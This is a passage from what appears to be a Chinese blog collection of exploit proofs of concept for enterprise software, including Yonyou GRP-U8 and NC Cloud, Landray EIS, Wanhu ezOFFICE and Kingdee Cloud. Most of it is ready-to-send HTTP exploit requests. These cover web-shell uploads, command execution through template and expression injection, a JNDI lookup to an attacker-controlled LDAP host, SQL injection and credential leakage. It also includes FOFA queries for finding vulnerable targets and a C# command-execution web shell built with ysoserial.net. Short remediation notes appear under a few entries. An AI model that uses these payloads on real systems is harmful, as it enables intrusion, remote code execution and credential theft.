<h5 id="GRP-U8-UploadFile-命令执行"><a href="#GRP-U8-UploadFile-命令执行" class="headerlink" title="GRP U8 UploadFile 命令执行"></a>GRP U8 UploadFile 命令执行</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /UploadFile HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryicNNJvjQHmXpnjFc</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryicNNJvjQHmXpnjFc</span><br><span class="line">Content-Disposition: form-data; name=&quot;input_localfile&quot;; filename=&quot;demodemo.png&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;jatools Class=&quot;jatools.ReportDocument&quot; Name=&quot;jatools report template&quot;&gt;</span><br><span class="line">&lt;VariableContext&gt;</span><br><span class="line">&lt;/VariableContext&gt;</span><br><span class="line">&lt;Page&gt;</span><br><span class="line">&lt;Name&gt;panel&lt;/Name&gt;</span><br><span class="line">&lt;Children ItemClass=&quot;PagePanel&quot;&gt;</span><br><span class="line">&lt;Item0&gt;</span><br><span class="line">&lt;Name&gt;header&lt;/Name&gt;</span><br><span class="line">&lt;Width&gt;753&lt;/Width&gt;</span><br><span class="line">&lt;Height&gt;80&lt;/Height&gt;</span><br><span class="line">&lt;Children ItemClass=&quot;Label&quot;&gt;</span><br><span class="line">&lt;Item0&gt;</span><br><span class="line">&lt;ForeColor&gt;-65536&lt;/ForeColor&gt;</span><br><span class="line">&lt;X&gt;41&lt;/X&gt;</span><br><span class="line">&lt;Y&gt;15&lt;/Y&gt;</span><br><span class="line">&lt;Width&gt;362&lt;/Width&gt;</span><br><span class="line">&lt;Height&gt;62&lt;/Height&gt;</span><br><span class="line">&lt;/Item0&gt;</span><br><span class="line">&lt;/Children&gt;</span><br><span class="line">&lt;Type&gt;100&lt;/Type&gt;</span><br><span class="line">&lt;/Item0&gt;</span><br><span class="line">&lt;Item1&gt;</span><br><span class="line">&lt;Name&gt;footer&lt;/Name&gt;</span><br><span class="line">&lt;Y&gt;802&lt;/Y&gt;</span><br><span class="line">&lt;Width&gt;753&lt;/Width&gt;</span><br><span class="line">&lt;Height&gt;280&lt;/Height&gt;</span><br><span class="line">&lt;Type&gt;103&lt;/Type&gt;</span><br><span class="line">&lt;/Item1&gt;</span><br><span class="line">&lt;Item2&gt;</span><br><span class="line">&lt;Name&gt;body&lt;/Name&gt;</span><br><span class="line">&lt;Y&gt;80&lt;/Y&gt;</span><br><span class="line">&lt;Width&gt;753&lt;/Width&gt;</span><br><span class="line">&lt;Height&gt;722&lt;/Height&gt;</span><br><span class="line">&lt;Children ItemClass=&quot;Table&quot;&gt;</span><br><span class="line">&lt;Item0&gt;</span><br><span class="line">&lt;NodePath&gt;学生表&lt;/NodePath&gt;</span><br><span class="line">&lt;X&gt;115&lt;/X&gt;</span><br><span class="line">&lt;Y&gt;77&lt;/Y&gt;</span><br><span class="line">&lt;Children&gt;</span><br><span class="line">&lt;Item0 Class=&quot;Label&quot;&gt;</span><br><span class="line">&lt;Text&gt;家庭成员&lt;/Text&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;PrintStyle&gt;united-level:1;&lt;/PrintStyle&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;3&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;0&lt;/Col&gt;</span><br><span class="line">&lt;RowSpan&gt;2&lt;/RowSpan&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item0&gt;</span><br><span class="line">&lt;Item1 Class=&quot;Label&quot;&gt;</span><br><span class="line">&lt;Text&gt;关系&lt;/Text&gt;</span><br><span class="line">&lt;BackColor&gt;-4144897&lt;/BackColor&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;3&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;1&lt;/Col&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item1&gt;</span><br><span class="line">&lt;Item2 Class=&quot;Label&quot;&gt;</span><br><span class="line">&lt;Text&gt;性别&lt;/Text&gt;</span><br><span class="line">&lt;BackColor&gt;-4144897&lt;/BackColor&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;3&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;2&lt;/Col&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item2&gt;</span><br><span class="line">&lt;Item3 Class=&quot;Label&quot;&gt;</span><br><span class="line">&lt;Text&gt;年龄&lt;/Text&gt;</span><br><span class="line">&lt;BackColor&gt;-4144897&lt;/BackColor&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;3&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;3&lt;/Col&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item3&gt;</span><br><span class="line">&lt;Item4 Class=&quot;Label&quot;&gt;</span><br><span class="line">&lt;Text&gt;得分&lt;/Text&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;2&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;0&lt;/Col&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item4&gt;</span><br><span class="line">&lt;Item5 Class=&quot;Label&quot;&gt;</span><br><span class="line">&lt;Text&gt;性别&lt;/Text&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;1&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;0&lt;/Col&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item5&gt;</span><br><span class="line">&lt;Item6 Class=&quot;Label&quot;&gt;</span><br><span class="line">&lt;Text&gt;姓名&lt;/Text&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;0&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;0&lt;/Col&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item6&gt;</span><br><span class="line">&lt;Item7 Class=&quot;Text&quot;&gt;</span><br><span class="line">&lt;Variable&gt;=$学生表&lt;/Variable&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;0&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;1&lt;/Col&gt;</span><br><span class="line">&lt;ColSpan&gt;3&lt;/ColSpan&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item7&gt;</span><br><span class="line">&lt;Item8 Class=&quot;Text&quot;&gt;</span><br><span class="line">&lt;Variable&gt;=$学生表.value()&lt;/Variable&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;1&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;1&lt;/Col&gt;</span><br><span class="line">&lt;ColSpan&gt;3&lt;/ColSpan&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item8&gt;</span><br><span class="line">&lt;Item9 Class=&quot;Text&quot;&gt;</span><br><span class="line">&lt;Variable&gt;=$学生表.getName()&lt;/Variable&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;2&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;1&lt;/Col&gt;</span><br><span class="line">&lt;ColSpan&gt;3&lt;/ColSpan&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item9&gt;</span><br><span class="line">&lt;Item10 Class=&quot;RowPanel&quot;&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;4&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;0&lt;/Col&gt;</span><br><span class="line">&lt;ColSpan&gt;4&lt;/ColSpan&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;Children ItemClass=&quot;Text&quot;&gt;</span><br><span class="line">&lt;Item0&gt;</span><br><span class="line">&lt;Variable&gt;&lt;/Variable&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;4&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;3&lt;/Col&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item0&gt;</span><br><span class="line">&lt;Item1&gt;</span><br><span class="line">&lt;Variable&gt;&lt;/Variable&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;4&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;2&lt;/Col&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item1&gt;</span><br><span class="line">&lt;Item2&gt;</span><br><span class="line">&lt;Variable&gt;;&lt;/Variable&gt;</span><br><span class="line">&lt;Border/&gt;</span><br><span class="line">&lt;Cell&gt;</span><br><span class="line">&lt;Row&gt;4&lt;/Row&gt;</span><br><span class="line">&lt;Col&gt;1&lt;/Col&gt;</span><br><span class="line">&lt;/Cell&gt;</span><br><span class="line">&lt;/Item2&gt;</span><br><span class="line">&lt;/Children&gt;</span><br><span class="line">&lt;NodePath&gt;成员&lt;/NodePath&gt;</span><br><span class="line">&lt;/Item10&gt;</span><br><span class="line">&lt;/Children&gt;</span><br><span class="line">&lt;ColumnWidths&gt;60,60,60,60&lt;/ColumnWidths&gt;</span><br><span class="line">&lt;RowHeights&gt;20,20,20,20,20&lt;/RowHeights&gt;</span><br><span class="line">&lt;/Item0&gt;</span><br><span class="line">&lt;/Children&gt;</span><br><span class="line">&lt;Type&gt;102&lt;/Type&gt;</span><br><span class="line">&lt;/Item2&gt;</span><br><span class="line">&lt;/Children&gt;</span><br><span class="line">&lt;/Page&gt;</span><br><span class="line">&lt;NodeSource&gt;</span><br><span class="line">&lt;Children ItemClass=&quot;ArrayNodeSource&quot;&gt;</span><br><span class="line">&lt;Item0&gt;</span><br><span class="line">&lt;Children ItemClass=&quot;ArrayNodeSource&quot;&gt;</span><br><span class="line">&lt;Item0&gt;</span><br><span class="line">&lt;TagName&gt;成员&lt;/TagName&gt;</span><br><span class="line">&lt;Expression&gt;$.value()&lt;/Expression&gt;</span><br><span class="line">&lt;/Item0&gt;</span><br><span class="line">&lt;/Children&gt;</span><br><span class="line">&lt;TagName&gt;学生表&lt;/TagName&gt;</span><br><span class="line">&lt;Expression&gt;new Object[]&#123;new BufferedReader(new InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream())).readLine()&#125;&lt;/Expression&gt;</span><br><span class="line">&lt;/Item0&gt;</span><br><span class="line">&lt;/Children&gt;</span><br><span class="line">&lt;/NodeSource&gt;</span><br><span class="line">&lt;/jatools&gt;</span><br><span class="line">------WebKitFormBoundaryicNNJvjQHmXpnjFc</span><br><span class="line">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryicNNJvjQHmXpnjFc--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问&#x2F;u8qx&#x2F;tools&#x2F;defaultviewer.jsp?file&#x3D;..&#x2F;..&#x2F;upload&#x2F;demodemo.png HTTP&#x2F;1.1</p>
<h5 id="移动管理系统-uploadApk-do-任意文件上传漏洞"><a href="#移动管理系统-uploadApk-do-任意文件上传漏洞" class="headerlink" title="移动管理系统 uploadApk.do 任意文件上传漏洞"></a>移动管理系统 uploadApk.do 任意文件上传漏洞</h5><p>网络测绘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;用友-移动系统管理&quot;</span><br></pre></td></tr></table></figure>



<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryvLTG6zlX0gZ8LzO3</span><br><span class="line">Content-Disposition: form-data; name=&quot;downloadpath&quot;; filename=&quot;a.jsp&quot;</span><br><span class="line">Content-Type: application/msword</span><br><span class="line"></span><br><span class="line">hello</span><br><span class="line">------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/maupload/apk/a.jsp</span><br></pre></td></tr></table></figure>



<h5 id="NC-Cloud-jsinvoke-任意文件上传漏洞"><a href="#NC-Cloud-jsinvoke-任意文件上传漏洞" class="headerlink" title="NC Cloud jsinvoke 任意文件上传漏洞"></a>NC Cloud jsinvoke 任意文件上传漏洞</h5><p>网络测绘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;用友-NC-Cloud&quot;</span><br></pre></td></tr></table></figure>



<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /uapjs/jsinvoke/?action=invoke</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;serviceName&quot;:&quot;nc.itf.iufo.IBaseSPService&quot;,</span><br><span class="line">    &quot;methodName&quot;:&quot;saveXStreamConfig&quot;,</span><br><span class="line">    &quot;parameterTypes&quot;:[</span><br><span class="line">        &quot;java.lang.Object&quot;,</span><br><span class="line">        &quot;java.lang.String&quot;</span><br><span class="line">    ], </span><br><span class="line">    &quot;parameters&quot;:[</span><br><span class="line">        &quot;$&#123;param.getClass().forName(param.error).newInstance().eval(param.cmd)&#125;&quot;,</span><br><span class="line">        &quot;webapps/nc_web/407.jsp&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /uapjs/jsinvoke/?action=invoke HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Length: 253</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;serviceName&quot;:&quot;nc.itf.iufo.IBaseSPService&quot;,&quot;methodName&quot;:&quot;saveXStreamConfig&quot;,&quot;parameterTypes&quot;:[&quot;java.lang.Object&quot;,&quot;java.lang.String&quot;],&quot;parameters&quot;:[&quot;$&#123;&#x27;&#x27;.getClass().forName(&#x27;javax.naming.InitialContext&#x27;).newInstance().lookup(&#x27;ldap://VPSip:1389/TomcatBypass/TomcatEcho&#x27;)&#125;&quot;,&quot;webapps/nc_web/301.jsp&quot;]&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmdtest.jsp?error=bsh.Interpreter&amp;cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream()) </span><br></pre></td></tr></table></figure>



<h5 id="GRP-U8-bx-historyDataCheck-jsp-SQL注入漏洞"><a href="#GRP-U8-bx-historyDataCheck-jsp-SQL注入漏洞" class="headerlink" title="GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞"></a>GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">userName=%27;WAITFOR%20DELAY%20%270:0:10%27--&amp;class.module.classLoader.DefaultAssertionStatus=</span><br></pre></td></tr></table></figure>





<h4 id="Landray-蓝凌"><a href="#Landray-蓝凌" class="headerlink" title="Landray 蓝凌"></a>Landray 蓝凌</h4><h5 id="EIS智慧协同平台文件上传"><a href="#EIS智慧协同平台文件上传" class="headerlink" title="EIS智慧协同平台文件上传"></a>EIS智慧协同平台文件上传</h5><h6 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h6><p>body&#x3D;”欢迎登录智慧协同平台”</p>
<h6 id="nuclei"><a href="#nuclei" class="headerlink" title="nuclei"></a>nuclei</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nuclei 验证</span><br><span class="line"></span><br><span class="line">id: landray-eis-saveImg-upload</span><br><span class="line"></span><br><span class="line">info:</span><br><span class="line">  name: landray-eis-saveImg-upload</span><br><span class="line">  author: landray-eis-saveImg-upload</span><br><span class="line"></span><br><span class="line">variables:</span><br><span class="line">  filename: &quot;&#123;&#123;to_lower(rand_base(10))&#125;&#125;&quot;</span><br><span class="line">  boundary: &quot;&#123;&#123;rand_base(16)&#125;&#125;&quot;</span><br><span class="line"></span><br><span class="line">http:</span><br><span class="line">  - raw:</span><br><span class="line">      - |</span><br><span class="line">        POST /eis/service/api.aspx?action=saveImg HTTP/1.1</span><br><span class="line">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="line">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">        Accept-Encoding: gzip, deflate</span><br><span class="line">        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">        Connection: close</span><br><span class="line">        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">        Upgrade-Insecure-Requests: 1</span><br><span class="line">        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary&#123;&#123;boundary&#125;&#125;</span><br><span class="line">        Content-Length: 208</span><br><span class="line">        </span><br><span class="line">        ------WebKitFormBoundary&#123;&#123;boundary&#125;&#125;</span><br><span class="line">        Content-Disposition: form-data; name=&quot;file&quot;filename=&quot;&#123;&#123;filename&#125;&#125;.asp&quot;</span><br><span class="line">        Content-Type: text/html</span><br><span class="line">        </span><br><span class="line">        &lt;% response.write(&quot;hello world&quot;)%&gt;</span><br><span class="line">        ------WebKitFormBoundary&#123;&#123;boundary&#125;&#125;--</span><br><span class="line"></span><br><span class="line">      - |</span><br><span class="line">        GET /files/editor_img/&#123;&#123;aspfilenammme&#125;&#125; HTTP/1.1</span><br><span class="line">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="line">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    extractors:</span><br><span class="line">      - type: regex</span><br><span class="line">        part: body</span><br><span class="line">        name: aspfilenammme</span><br><span class="line">        group: 1</span><br><span class="line">        internal: true</span><br><span class="line">        regex:</span><br><span class="line">          - &#x27;/files/editor_img/([0-9-a-z]+/\w+\.asp)&#x27; </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    matchers:</span><br><span class="line">      - type: dsl</span><br><span class="line">        dsl:</span><br><span class="line">          - &#x27;status_code==200 &amp;&amp; contains(body_1,&quot;editor_img&quot;) &amp;&amp; contains(body_2,&quot;hello world&quot;)&#x27;</span><br></pre></td></tr></table></figure>









<h4 id="万户协同办公平台未授权访问漏洞"><a href="#万户协同办公平台未授权访问漏洞" class="headerlink" title="万户协同办公平台未授权访问漏洞"></a>万户协同办公平台未授权访问漏洞</h4><h5 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h5><p>万户ezOFFICE协同管理平台涵盖门户自定义平台、信息知识平台管理、系统管理平台功能，它以工作流引擎为底层服务，以通讯沟通平台为交流手段，以门户自定义平台为信息推送显示平台，为用户提供集成的协同工作环境。该平台存在未授权访问漏洞，攻击者可以从evoInterfaceServlet接口获得系统登录账号和用MD5加密的密码。</p>
<h5 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h5><p>version &lt;&#x3D;12.4.12.25</p>
<h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.name=&quot;万户 Ezoffice OA&quot;</span><br></pre></td></tr></table></figure>

<h5 id="poc-3"><a href="#poc-3" class="headerlink" title="poc"></a>poc</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /defaultroot/evoInterfaceServlet?paramType=user HTTP/1.1</span><br><span class="line">Host:</span><br></pre></td></tr></table></figure>

<h5 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h5><p><a href="http://www.whir.net/CustomerService/index.html">http://www.whir.net/CustomerService/index.html</a></p>
<h4 id="金蝶云星空RCE漏洞"><a href="#金蝶云星空RCE漏洞" class="headerlink" title="金蝶云星空RCE漏洞"></a>金蝶云星空RCE漏洞</h4><blockquote>
<p><a href="https://blog.csdn.net/qq_41904294/article/details/131332436?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_41904294/article/details/131332436?spm=1001.2014.3001.5502</a></p>
</blockquote>
<h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>由于金蝶云星空数据通信默认采用的是二进制数据格式，需要进行序列化与反序列化，在此过程中未对数据进行签名或校验，导致客户端发出的数据可被攻击者恶意篡改，写入包含恶意代码的序列化数据，达到在服务端远程命令执行的效果。该漏洞不仅存在于金蝶云星空管理中心（默认8000端口），普通应用（默认80端口）也存在类似问题。</p>
<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>6.x版本：低于6.2.1012.4</p>
<p>7.x版本：7.0.352.16 至 7.7.0.202111</p>
<p>8.x版本：8.0.0.202205 至 8.1.0.20221110</p>
<h5 id="fofa语法-1"><a href="#fofa语法-1" class="headerlink" title="fofa语法"></a>fofa语法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;金蝶云星空-管理中心&quot;</span><br></pre></td></tr></table></figure>

<h5 id="poc-4"><a href="#poc-4" class="headerlink" title="poc"></a>poc</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">POST</span> <span class="string">/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">your-ip</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">text/json</span></span><br><span class="line"> </span><br><span class="line">&#123;<span class="string">&quot;ap0&quot;</span><span class="string">:&quot;asdas&quot;</span>,<span class="string">&quot;format&quot;</span><span class="string">:&quot;3&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230624233109994.png" alt="image-20230624233109994"></p>
<p>使用 ysoserial.net工具构造Payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c &quot;a.cs;System.Windows.Forms.dll;System.Web.dll;System.dll&quot;</span><br></pre></td></tr></table></figure>

<p>命令中 -f 指定的是.net程序中的序列化类，-g  是ysoserial.net工具中的攻击链， 这里指定的是ActivitySurrogateSelectorFromFile链，这个攻击链可加载自定义的程序集。-c 是构造的程序集（a.cs），后面的dll文件是.NET  Framework中的一个核心DLL文件，包含了一些相关的类和方法(自行加载，不需要构造)</p>
<p>编写一个从请求头中获取参数执行命令的ASP.NET 程序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">E</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">E</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.Web.<span class="type">HttpContext</span> <span class="variable">context</span> <span class="operator">=</span> System.Web.HttpContext.Current;</span><br><span class="line">        context.Server.ClearError();</span><br><span class="line">        context.Response.Clear();</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.<span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">System</span>.Diagnostics.Process();</span><br><span class="line">            process.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            <span class="type">string</span> <span class="variable">cmd</span> <span class="operator">=</span> context.Request.Headers[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">            process.StartInfo.Arguments = <span class="string">&quot;/c &quot;</span> + cmd;</span><br><span class="line">            process.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">            process.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">            process.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">            process.Start();</span><br><span class="line">            <span class="type">string</span> <span class="variable">output</span> <span class="operator">=</span> process.StandardOutput.ReadToEnd();</span><br><span class="line">            context.Response.Write(output);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (System.Exception) &#123;&#125;</span><br><span class="line">        context.Response.Flush();</span><br><span class="line">        context.Response.End();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PS：通过接收 HTTP请求中的 cmd 参数，将其作为命令行参数传递给 cmd.exe 进程，并获取其输出结果，最终将输出结果作为 HTTP 响应返回给客户端（需放到ysoserial.net工具目录下或指定绝对路径）</p>
<p>生成序列化数据，加载到PoC中</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230624233741312.png" alt="image-20230624233741312"></p>
<p>最终exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Type: text/json</span><br><span class="line">cmd: dir</span><br><span class="line"> </span><br><span class="line">&#123;&quot;ap0&quot;:&quot;&quot;,&quot;format&quot;:&quot;3&quot;&#125;</span><br></pre></td></tr></table></figure>





<h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><p>8.x版本可通过手动添加安全配置并重启IIS的方式进行缓解，注意管理中心与普通应用配置文件均需添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 普通应用配置：&#123;WebROOT&#125;\Kingdee\K3Cloud\WebSite\App_Data\Common.config</span><br><span class="line"># 管理中心配置：&#123;WebROOT&#125;\Kingdee\K3Cloud\Services\ManagementService\App_Data\Common.config</span><br><span class="line"> </span><br><span class="line">EnabledKDSVCBinary = false</span><br></pre></td></tr></table></figure>

<p>由于该漏洞不仅影响管理中心（默认8000端口），也影响普通应用（默认80端口）。如果其它版本通过限制访问来源临时缓解漏洞，需要考虑是否会中断普通用户Web业务。</p>
<h6 id="升级修复方案"><a href="#升级修复方案" class="headerlink" title="升级修复方案"></a>升级修复方案</h6><p>7.x版本必须先安装全量补丁（修复代码）后安装临时补丁（添加安全配置）</p>
<p>8.x版本管理中心（默认8000端口）默认不对外开放，且包含修复代码。但是直接安装临时补丁可能会失败，所以依旧建议先安装全量补丁（修复代码）后安装临时补丁（添加安全配置）</p>
<h4 id="用友畅捷通T-SQL注入"><a href="#用友畅捷通T-SQL注入" class="headerlink" title="用友畅捷通T+SQL注入"></a>用友畅捷通T+SQL注入</h4><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#fofa</span><br><span class="line">app=&quot;畅捷通-TPlus&quot;</span><br><span class="line">#hunter</span><br><span class="line">app.name=&quot;畅捷通 T+&quot;</span><br></pre></td></tr></table></figure>

<p>影响版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">畅捷通T+ 13.0</span><br><span class="line">畅捷通T+ 16.0</span><br></pre></td></tr></table></figure>

<p>poc</p>
